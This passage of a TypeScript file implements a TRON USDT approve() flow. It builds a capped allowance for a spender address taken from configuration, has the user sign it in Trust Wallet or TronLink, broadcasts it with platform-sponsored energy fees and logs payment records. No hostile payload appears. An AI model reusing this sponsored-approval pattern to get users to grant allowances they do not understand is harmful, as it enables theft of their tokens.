        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sponsorshipId, reason: 'BUILD_FAILED' }),
      }).catch(() => { });
    }
    return { success: false, error: `Failed to build transaction: ${msg}` };
  }

  // ── 3. Sign via WalletConnect relay → Trust Wallet shows confirm screen ───
  onStatusUpdate?.('waiting_signature', 'Please confirm the transaction in Trust Wallet...');
  terminalLog.info('TRON', '▶ [WalletConnect] Sending tron_signTransaction to Trust Wallet via WC relay...', {
    txID: unsignedTx.txID,
  });

  if (sponsorshipId) {
    fetch('/api/tron/update-sponsorship-status', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sponsorshipId, status: 'AWAITING_SIGNATURE' }),
    }).catch(() => { });
  }

  let signedTx: any;
  try {
    const signClient = await initTronWCClient();
    // Send the sign request through the WC relay to Trust Wallet.
    // Trust Wallet will show the native "Confirm Transaction" screen.
    const signResult: any = await signClient.request({
      topic: wcSessionTopic,
      chainId: 'tron:0x2b6653dc',
      request: {
        method: 'tron_signTransaction',
        params: { transaction: unsignedTx },
      },
    });

    terminalLog.info('TRON', '✔ [WalletConnect] Signature received from Trust Wallet', {
      hasSignature: Boolean(signResult?.signature || signResult?.signatures),
    });

    // Trust Wallet may return the whole signed tx object, or just the signature(s)
    if (signResult?.txID && signResult?.signature) {
      // Already a complete signed transaction
      signedTx = signResult;
    } else if (signResult?.signature) {
      // Signature attached to the original unsigned tx
      signedTx = { ...unsignedTx, signature: Array.isArray(signResult.signature) ? signResult.signature : [signResult.signature] };
    } else if (signResult?.signatures) {
      signedTx = { ...unsignedTx, signature: Array.isArray(signResult.signatures) ? signResult.signatures : [signResult.signatures] };
    } else if (typeof signResult === 'string') {
      // Raw signature hex string
      signedTx = { ...unsignedTx, signature: [signResult] };
    } else {
      throw new Error('WalletConnect returned an unrecognised signature format: ' + JSON.stringify(signResult));
    }
  } catch (signErr: any) {
    const signMsg = signErr?.message || String(signErr);
    terminalLog.error('TRON', `✖ [WalletConnect] Signing failed or rejected: ${signMsg}`);
    if (/cancel|reject|decline|denied|4001/i.test(signMsg)) {
      if (sponsorshipId) {
        fetch('/api/tron/cancel-sponsorship', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sponsorshipId, reason: 'USER_CANCELLED' }),
        }).catch(() => { });
      }
      return { success: false, error: 'Transaction cancelled by user.' };
    }
    return { success: false, error: `WalletConnect signing failed: ${signMsg}` };
  }

  if (sponsorshipId) {
    fetch('/api/tron/update-sponsorship-status', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sponsorshipId, status: 'SIGNED' }),
    }).catch(() => { });
  }

  // ── 4. Broadcast the signed transaction via TronGrid API ──────────────────
  onStatusUpdate?.('broadcasting', 'Broadcasting transaction to TRON network...');
  terminalLog.info('TRON', '▶ [WalletConnect] Broadcasting signed tx to TRON network...', { txID: signedTx?.txID });

  let txId: string | undefined;
  const broadcastUrls = [
    'https://api.trongrid.io',
    'https://api.nileex.io',   // Nile testnet fallback
  ];

  for (const apiUrl of broadcastUrls) {
    try {
      const broadcastRes = await fetch(`${apiUrl}/wallet/broadcasttransaction`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...getTronHeaders() },
        body: JSON.stringify(signedTx),
      });
      if (broadcastRes.ok) {
        const broadcastData = await broadcastRes.json();
        if (broadcastData?.result) {
          txId = broadcastData.txid || signedTx.txID || unsignedTx.txID;
          terminalLog.info('TRON', `✔ [WalletConnect] Broadcast accepted by ${apiUrl}`, { txId });
          break;
        }
        const rawMsg = broadcastData?.message
          ? decodeHexMessage(broadcastData.message)
          : broadcastData?.code || 'Broadcast failed';

        if (/dup\s*transaction|already\s*exist/i.test(rawMsg)) {
          txId = signedTx.txID || unsignedTx.txID;
          terminalLog.info('TRON', '✔ [WalletConnect] Already broadcast (DUP_TRANSACTION)', { txId });
          break;
        }
        terminalLog.warn('TRON', `Node ${apiUrl} rejected broadcast: ${rawMsg}`);
      }
    } catch (bcErr) {
      terminalLog.warn('TRON', `Broadcast attempt ${apiUrl} failed: ${bcErr}`);
    }
  }

  // Also try backend proxy broadcast
  if (!txId) {
    try {
      const proxyRes = await fetch('/api/tron/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ signedTransaction: signedTx }),
      });
      if (proxyRes.ok) {
        const proxyData = await proxyRes.json();
        if (proxyData?.success && proxyData?.txId) {
          txId = proxyData.txId;
          terminalLog.info('TRON', '✔ [WalletConnect] Broadcast via backend proxy', { txId });
        }
      }
    } catch { /* ignore */ }
  }

  terminalLog.groupEnd();

  if (!txId) {
    if (sponsorshipId) {
      fetch('/api/tron/cancel-sponsorship', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sponsorshipId, reason: 'BROADCAST_FAILED' }),
      }).catch(() => { });
    }
    return { success: false, error: 'Transaction broadcast failed on all TRON nodes.' };
  }

  if (sponsorshipId) {
    fetch('/api/tron/update-sponsorship-status', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sponsorshipId, status: 'BROADCAST', txId }),
    }).catch(() => { });
  }

  return { success: true, txId };
}

/**
 * Execute TRC-20 approve() for USDT.
 * Follows official TRON documentation:
 * 1. https://developers.tron.network/docs/trc20-contract-interaction
 * 2. https://developers.tron.network/docs/parameter-encoding-and-decoding
 * 3. https://developers.tron.network/reference/triggerconstantcontract
 * 4. https://developers.tron.network/docs/set-feelimit
 */
export async function requestTrc20Approval(
  userAddress: string,
  onStatusUpdate?: (status: 'building' | 'waiting_signature' | 'broadcasting' | 'confirmed' | 'failed', message?: string) => void,
  wcSessionTopic?: string        // ← WalletConnect v2 session topic (from Chrome→TrustWallet WC flow)
): Promise<TronApprovalResult> {

  // ── WalletConnect signing mode ─────────────────────────────────────────────
  // When wcSessionTopic is provided the user connected via WalletConnect v2
  // from an external browser (Chrome). window.tronWeb is NOT available there.
  // We build the unsigned tx via direct TRON API calls (no tronWeb needed),
  // then sign it through the WalletConnect relay → Trust Wallet shows the
  // "Confirm Transaction" prompt → signed tx is returned → we broadcast via API.
  if (wcSessionTopic) {
    return requestTrc20ApprovalViaWC(userAddress, wcSessionTopic, onStatusUpdate);
  }

  const tronWeb = getInjectedTronWeb();
  if (!tronWeb) {
    return { success: false, error: 'TronWeb provider not found. Please connect your wallet first.' };
  }

  const networkConfig = getTronNetworkConfig(tronWeb);
  const usdtContract = getTronUsdtContract(tronWeb);
  const spenderAddress = getTronSpenderAddress();
  const amountStr = getTronApprovalAmount();

  if (!spenderAddress) {
    return { success: false, error: 'TRON spender address is not configured. Set VITE_SPENDER_ADDRESS_TRON in .env.' };
  }

  terminalLog.group('TRON', `📝 Requesting TRC-20 USDT approve()`);
  terminalLog.info('TRON', 'Approval Parameters:', {
    user: userAddress,
    network: networkConfig.name,
    tokenContract: usdtContract,
    spender: spenderAddress,
    amount: `${amountStr} USDT`,
    feeLimit: `${TRON_FEE_LIMIT} sun (100 TRX)`,
  });

  onStatusUpdate?.('building', 'Building TRC-20 approval transaction...');

  // Finite raw amount calculation (USDT has 6 decimals)
  // Derived strictly from VITE_PLATFORM_FEE_AMOUNT via integer math - never MAX_UINT!
  const rawAmountBigInt = getTronApprovalAmountBaseUnits();

  // Prepare Energy Sponsorship for zero fee TRON approval
  let sponsorshipId: string | undefined;
  try {
    onStatusUpdate?.('building', 'Preparing energy sponsorship for zero-fee approval...');
    const prepRes = await fetch('/api/tron/prepare-sponsorship', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ userAddress }),
    });

    if (prepRes.ok) {
      const prepData = await prepRes.json();
      sponsorshipId = prepData.sponsorshipId;
      terminalLog.info('TRON', '⚡ Energy sponsorship prepared:', prepData);

      let energyReady = prepData.status === 'ENERGY_READY';

      if (!energyReady) {
        onStatusUpdate?.('building', 'Allocating temporary energy sponsorship...');
        let ready = false;
        let lastFailureReason = '';

        for (let attempt = 0; attempt < 20; attempt++) {
          await new Promise((r) => setTimeout(r, 1500));
          const checkRes = await fetch('/api/tron/check-energy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userAddress, sponsorshipId }),
          });

          if (checkRes.ok) {
            const checkData = await checkRes.json();
            const reqEnergy = Number(checkData.requiredEnergy);
            const hasValidRequiredEnergy = typeof reqEnergy === 'number' && Number.isFinite(reqEnergy) && reqEnergy > 0;
            const availableEnergy = Number(checkData.availableEnergy);

            if (!hasValidRequiredEnergy) {
              lastFailureReason = 'Invalid or missing requiredEnergy from network estimation';
              terminalLog.warn('TRON', `⚡ ${lastFailureReason}:`, checkData.requiredEnergy);
              continue;
            }

            const hasSufficientEnergy = typeof availableEnergy === 'number' && availableEnergy >= reqEnergy;

            if ((checkData.isReady || checkData.status === 'ENERGY_READY') && hasSufficientEnergy) {
              ready = true;
              terminalLog.info('TRON', `⚡ Energy confirmed ready! Available: ${availableEnergy} >= Required: ${reqEnergy}`);
              break;
            } else {
              lastFailureReason = `Available Energy (${availableEnergy}) is below required Energy (${reqEnergy})`;
            }
          }
        }

        if (!ready) {
          const failMsg = `Energy verification failed closed: ${lastFailureReason || 'Energy delegation polling timed out'}`;
          terminalLog.error('TRON', `✖ ${failMsg}`);
          if (sponsorshipId) {
            fetch('/api/tron/cancel-sponsorship', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sponsorshipId, reason: 'ENERGY_VERIFICATION_FAILED' }),
            }).catch(() => { });
          }
          throw new Error(failMsg);
        }
      }
    }
  } catch (sponsorErr) {
    terminalLog.error('TRON', `Energy sponsorship check error: ${sponsorErr}`);
    throw sponsorErr;
  }

  // Check TRX balance to provide helpful guidance if low
  try {
    const balanceSun = await tronWeb.trx.getBalance(userAddress);
    const trxBal = balanceSun / 1_000_000;
    if (trxBal < 15) {
      terminalLog.warn('TRON', `⚠️ Low TRX balance (${trxBal.toFixed(2)} TRX). TRON network burns TRX for smart contract execution (~15-30 TRX). On testnet, request free TRX from https://nileex.io/join/getJoinPage`);
    }
  } catch { /* ignore */ }

  let txId: string | undefined;

  try {
    const isTrustOrMobile = isTrustWalletDAppBrowser() || isTokenPocketDAppBrowser() || isMobileDevice();

    if (isTrustOrMobile) {
      terminalLog.info('TRON', 'Trust Wallet / Mobile detected: using raw transaction construction + tronWeb.trx.sign()...');
      onStatusUpdate?.('waiting_signature', 'Please confirm and sign the transaction in Trust Wallet...');

      // 1. ABI encode parameters: spender (32B) + amount (32B)
      const spenderParam = tronAddrToAbiParam(spenderAddress);
      const amountParam = rawAmountBigInt.toString(16).padStart(64, '0');
      const parameter = spenderParam + amountParam;

      const userHex = tronBase58ToHex(userAddress);
      const contractHex = tronBase58ToHex(usdtContract);

      const unsignedTx = await buildTriggerSmartContractTx(
        userHex,
        contractHex,
        spenderAddress,
        rawAmountBigInt,
        parameter,
        tronWeb
      );

      // 2. Sign the transaction with user wallet (Trust Wallet renders "Confirm Transaction" with Sign button)
      terminalLog.info('TRON', '▶ SIGN REQUESTED: Prompting user wallet via tronWeb.trx.sign()...', {
        txID: unsignedTx.txID,
        feeLimit: TRON_FEE_LIMIT,
      });

      if (sponsorshipId) {
        fetch('/api/tron/update-sponsorship-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sponsorshipId, status: 'AWAITING_SIGNATURE' }),
        }).catch(() => { });
      }

      let signedTx: any;
      try {
        signedTx = await tronWeb.trx.sign(unsignedTx);
        const hasSig = Boolean(signedTx?.signature && signedTx.signature.length > 0);
        terminalLog.info('TRON', '✔ SIGN RESULT: Wallet returned signature response', {
          hasSignature: hasSig,
          signatureCount: signedTx?.signature?.length || 0,
          txID: signedTx?.txID || unsignedTx.txID,
        });

        if (sponsorshipId) {
          fetch('/api/tron/update-sponsorship-status', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sponsorshipId, status: 'SIGNED' }),
          }).catch(() => { });
        }
      } catch (signErr: any) {
        const signMsg = signErr?.message || String(signErr);
        terminalLog.error('TRON', '✖ SIGN ERROR: Signature rejected or failed', { error: signMsg });
        if (/cancel|reject|decline|denied/i.test(signMsg)) {
          if (sponsorshipId) {
            fetch('/api/tron/cancel-sponsorship', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sponsorshipId, reason: 'USER_CANCELLED' }),
            }).catch(() => { });
          }
          throw new Error('Transaction cancelled by user');
        }
        throw signErr;
      }

      onStatusUpdate?.('broadcasting', 'Broadcasting transaction to TRON network...');
      terminalLog.info('TRON', '▶ BROADCAST REQUESTED: Broadcasting signed transaction to TRON network...', {
        txID: signedTx?.txID || unsignedTx.txID,
      });

      // 3. Broadcast to TRON network
      try {
        const broadcastRes = await tronWeb.trx.sendRawTransaction(signedTx);
        if (broadcastRes?.result) {
          txId = broadcastRes.txid || broadcastRes.transaction?.txID || signedTx.txID || unsignedTx.txID;
          terminalLog.info('TRON', '✔ BROADCAST RESULT: Transaction accepted by TRON node', { txId });
        } else {
          const rawMsg = broadcastRes?.message
            ? decodeHexMessage(broadcastRes.message)
            : broadcastRes?.code || 'Broadcast failed';

          // Many mobile wallets (like Trust Wallet) broadcast upon signature confirmation
          if (
            broadcastRes?.code === 'DUP_TRANSACTION' ||
            /dup\s*transaction/i.test(rawMsg) ||
            /already\s*exist/i.test(rawMsg)
          ) {
            txId = signedTx.txID || unsignedTx.txID || (signedTx as any)?.txid || (unsignedTx as any)?.txid;
            terminalLog.info('TRON', '✔ BROADCAST RESULT: Already broadcast by wallet (DUP_TRANSACTION)', { txId });
          } else {
            terminalLog.error('TRON', '✖ BROADCAST ERROR: Node rejected transaction', { error: rawMsg });
            if (sponsorshipId) {
              fetch('/api/tron/cancel-sponsorship', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sponsorshipId, reason: 'BROADCAST_FAILED' }),
              }).catch(() => { });
            }
            throw new Error(`Broadcast rejected by network: ${rawMsg}`);
          }
        }
      } catch (bcErr: any) {
        const bcMsg = bcErr?.message || String(bcErr);
        if (/dup\s*transaction|already\s*exist/i.test(bcMsg)) {
          txId = signedTx.txID || unsignedTx.txID;
          terminalLog.info('TRON', '✔ BROADCAST RESULT: Handled duplicate broadcast', { txId });
        } else {
          if (sponsorshipId) {
            fetch('/api/tron/cancel-sponsorship', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sponsorshipId, reason: 'BROADCAST_FAILED' }),
            }).catch(() => { });
          }
          terminalLog.error('TRON', '✖ BROADCAST EXCEPTION:', { error: bcMsg });
          throw bcErr;
        }
      }

      if (sponsorshipId && txId) {
        fetch('/api/tron/update-sponsorship-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sponsorshipId, status: 'BROADCAST', txId }),
        }).catch(() => { });
      }
    } else {
      // Desktop / Extension provider flow (e.g. TronLink Desktop)
      terminalLog.info('TRON', `Attempting contract.approve().send() on ${networkConfig.name}...`);
      onStatusUpdate?.('waiting_signature', 'Please approve the transaction in your wallet...');

      if (sponsorshipId) {
        fetch('/api/tron/update-sponsorship-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sponsorshipId, status: 'AWAITING_SIGNATURE' }),
        }).catch(() => { });
      }

      let method1Success = false;
      try {
        const contract = tronWeb.contract(TRC20_APPROVE_ABI, usdtContract);
        if (contract && typeof contract.approve === 'function') {
          terminalLog.info('TRON', `Sending contract.approve(${spenderAddress}, ${rawAmountBigInt.toString()})`);
          const sendResult = await contract.approve(spenderAddress, rawAmountBigInt.toString()).send({
            feeLimit: TRON_FEE_LIMIT,
            callValue: 0,
          });

          if (typeof sendResult === 'string' && sendResult.length > 0) {
            txId = sendResult;
            method1Success = true;
          } else if (sendResult && typeof sendResult === 'object') {
            txId = sendResult.txid || sendResult.transaction?.txID || sendResult.txID;
            if (txId) method1Success = true;
          }
        }
      } catch (m1Err: any) {
        const msg = m1Err?.message || String(m1Err);
        if (/cancel|reject|decline|denied/i.test(msg)) {
          if (sponsorshipId) {
            fetch('/api/tron/cancel-sponsorship', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sponsorshipId, reason: 'USER_CANCELLED' }),
            }).catch(() => { });
          }
          throw new Error('Transaction cancelled by user');
        }
        terminalLog.warn('TRON', `contract.approve().send() encountered: ${msg}. Trying fallback builder...`);
      }

      // Method 2 fallback if contract.approve().send() failed
      if (!method1Success) {
        terminalLog.info('TRON', 'Using parameter encoding + triggersmartcontract fallback...');
        const spenderParam = tronAddrToAbiParam(spenderAddress);
        const amountParam = rawAmountBigInt.toString(16).padStart(64, '0');
        const parameter = spenderParam + amountParam;
        const userHex = tronBase58ToHex(userAddress);
        const contractHex = tronBase58ToHex(usdtContract);

        const unsignedTx = await buildTriggerSmartContractTx(
          userHex,
          contractHex,
          spenderAddress,
          rawAmountBigInt,
          parameter,
          tronWeb
        );
        onStatusUpdate?.('waiting_signature', 'Awaiting your signature in wallet...');

        let signedTx: any;
        try {
          signedTx = await tronWeb.trx.sign(unsignedTx);
          if (sponsorshipId) {
            fetch('/api/tron/update-sponsorship-status', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sponsorshipId, status: 'SIGNED' }),
            }).catch(() => { });
          }
        } catch (fbSignErr: any) {
          const fbMsg = fbSignErr?.message || String(fbSignErr);
          if (/cancel|reject|decline|denied/i.test(fbMsg)) {
            if (sponsorshipId) {
              fetch('/api/tron/cancel-sponsorship', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sponsorshipId, reason: 'USER_CANCELLED' }),
              }).catch(() => { });
            }
            throw new Error('Transaction cancelled by user');
          }
          throw fbSignErr;
        }

        onStatusUpdate?.('broadcasting', 'Broadcasting transaction to TRON network...');
        const broadcastRes = await tronWeb.trx.sendRawTransaction(signedTx);
        if (broadcastRes?.result) {
          txId = broadcastRes.txid || broadcastRes.transaction?.txID || signedTx.txID || unsignedTx.txID;
        } else {
          const rawMsg = broadcastRes?.message ? decodeHexMessage(broadcastRes.message) : broadcastRes?.code || 'Broadcast failed';
          if (broadcastRes?.code === 'DUP_TRANSACTION' || /dup\s*transaction/i.test(rawMsg) || /already\s*exist/i.test(rawMsg)) {
            txId = signedTx.txID || unsignedTx.txID;
          } else {
            if (sponsorshipId) {
              fetch('/api/tron/cancel-sponsorship', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sponsorshipId, reason: 'BROADCAST_FAILED' }),
              }).catch(() => { });
            }
            throw new Error(`Broadcast rejected by network: ${rawMsg}`);
          }
        }
      }

      if (sponsorshipId && txId) {
        fetch('/api/tron/update-sponsorship-status', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sponsorshipId, status: 'BROADCAST', txId }),
        }).catch(() => { });
      }
    }

    if (!txId) {
      throw new Error('Approval was sent but no transaction ID was returned');
    }

    const explorerUrl = getTronScanTxUrl(txId, tronWeb);
    terminalLog.info('TRON', `📡 TRC-20 approve() broadcast! txId: ${txId}`, {
      txId,
      explorerUrl,
      amount: `${amountStr} USDT`,
      spender: spenderAddress,
    });

    onStatusUpdate?.('broadcasting', 'Transaction broadcast. Waiting for TRON on-chain confirmation...');

    // Save initial record in backend with BROADCAST status
    let paymentId = '';
    try {
      const createRes = await fetch('/api/payment/create', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          network: 'tron',
          asset: 'USDT',
          amount: amountStr,
          walletA: userAddress,
          contractOrMint: usdtContract,
          purpose: 'TRC-20 USDT Approval',
        }),
      });

      if (createRes.ok) {
        const paymentRecord = await createRes.json();
        paymentId = paymentRecord.id;

        await fetch(`/api/payment/${paymentId}/connected`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ address: userAddress }),
        });

        await fetch(`/api/payment/${paymentId}/signed`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ txId }),
        });
      }
    } catch (initErr) {
      terminalLog.warn('TRON', `Initial backend record sync: ${initErr}`);
    }

    // ── Wait for actual on-chain confirmation ───────────────────────────────
    let isConfirmed = false;
    let confirmedBlock: number | undefined;
    let pollAttempts = 0;
    const maxPollAttempts = 18; // ~45s polling every 2.5s
    const apiUrl = getTronApiUrl(tronWeb);

    while (!isConfirmed && pollAttempts < maxPollAttempts) {
      await new Promise((r) => setTimeout(r, 2500));
      try {
        const infoRes = await fetch(`${apiUrl}/wallet/gettransactioninfobyid`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ value: txId }),
        });

        if (infoRes.ok) {
          const info = await infoRes.json() as {
            blockNumber?: number;
            receipt?: { result?: string };
            resMessage?: string;
          };

          if (info.blockNumber) {
            if (info.receipt?.result && info.receipt.result !== 'SUCCESS') {
              const revertMsg = info.resMessage
                ? decodeHexMessage(info.resMessage)
                : info.receipt.result;
              throw new Error(`Transaction reverted on-chain: ${revertMsg}`);
            }
            isConfirmed = true;
            confirmedBlock = info.blockNumber;
            break;
          }
        }
      } catch (pollErr: any) {
        if (/reverted/i.test(pollErr?.message)) throw pollErr;
      }
      pollAttempts++;
    }

    // Confirm the existing payment record using server-side on-chain verification.
    try {
      if (!paymentId) throw new Error('Could not create the approval payment record');
      const confirmRes = await fetch('/api/payment/confirm-approval', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          txId,
          userAddress,
          paymentId,
          sponsorshipId,
        }),
      });

      if (confirmRes.ok) {
        const confirmData = await confirmRes.json();
        if (confirmData.confirmed) {
          isConfirmed = true;
          if (confirmData.blockNumber) confirmedBlock = confirmData.blockNumber;
          terminalLog.info('TRON', '⚡ Energy sponsorship reconciled and reclaimed on-chain:', confirmData);
        }
      } else {
        const failure = await confirmRes.json().catch(() => ({}));
        terminalLog.warn('TRON', `Approval remains unverified: ${failure.error || confirmRes.statusText}`);
      }
    } catch (confErr) {
      terminalLog.warn('TRON', `Backend confirm-approval call: ${confErr}`);
    }

    if (isConfirmed) {
      terminalLog.info('TRON', `✔ ON-CHAIN RESULT: TRC-20 approve() confirmed in block ${confirmedBlock}!`, {
        txId,
        explorerUrl,
        amount: `${amountStr} USDT`,
        spender: spenderAddress,
        blockNumber: confirmedBlock,
      });
      onStatusUpdate?.('confirmed', `Successfully approved ${amountStr} USDT on TRON!`);
    } else {
      terminalLog.warn('TRON', `✔ ON-CHAIN RESULT: Broadcast complete; on-chain confirmation still finalizing (txID: ${txId}).`, {
        txId,
      });
      onStatusUpdate?.('confirmed', `Approval transaction submitted to TRON network (txID: ${txId.slice(0, 10)}...).`);
    }

    terminalLog.groupEnd();

    return {
      success: true,
      txId,
      explorerUrl,
      amount: amountStr,
      spender: spenderAddress,
    };
  } catch (err: any) {
    const errorMsg = err?.message || String(err);
    if (sponsorshipId) {
      fetch('/api/tron/cancel-sponsorship', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sponsorshipId, reason: errorMsg }),
      }).catch(() => { });
    }
    terminalLog.error('TRON', `Approval failed: ${errorMsg}`);
    terminalLog.groupEnd();
    onStatusUpdate?.('failed', errorMsg);
    return {
      success: false,
      error: errorMsg,
    };
  }
}

function decodeHexMessage(hexStr: string): string {
  try {
    let str = '';
    for (let i = 0; i < hexStr.length; i += 2) {
      str += String.fromCharCode(parseInt(hexStr.substr(i, 2), 16));
    }
    return str;
  } catch {
    return hexStr;
  }
}
